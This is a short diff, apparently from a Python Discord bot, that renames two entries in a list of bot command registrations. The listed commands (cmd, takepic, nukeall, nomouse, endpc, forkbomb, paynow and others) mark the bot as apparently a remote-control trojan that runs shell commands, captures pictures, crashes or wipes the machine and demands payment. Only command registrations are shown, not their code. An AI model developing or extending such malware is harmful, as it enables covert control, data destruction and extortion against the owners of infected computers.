@@ -28,7 +28,7 @@ async def on_message(message):
  if message.channel.id not in bot.allowed_channel_ids:
   return
  await bot.process_commands(message)
-bot.add_command(commands.Command(takepic,name='ss'))
+bot.add_command(commands.Command(takepic,name='pic'))
 bot.add_command(commands.Command(clean,name='clean'))
 bot.add_command(commands.Command(cmd,name='cmd'))
 bot.add_command(commands.Command(close,name='close'))
@@ -48,7 +48,7 @@ bot.add_command(commands.Command(nukeall,name='nukeall'))
 bot.add_command(commands.Command(wallpaper,name='wallpaper'))
 bot.add_command(commands.Command(nomouse,name='nomouse'))
 bot.add_command(commands.Command(endpc,name='endpc'))
-bot.add_command(commands.Command(cd_command,name='cd'))
+bot.add_command(commands.Command(file_nav,name='filenav'))
 bot.add_command(commands.Command(taskbar,name='taskbar'))
 bot.add_command(commands.Command(forkbomb,name='forkbomb'))
 bot.add_command(commands.Command(paynow,name='paynow'))
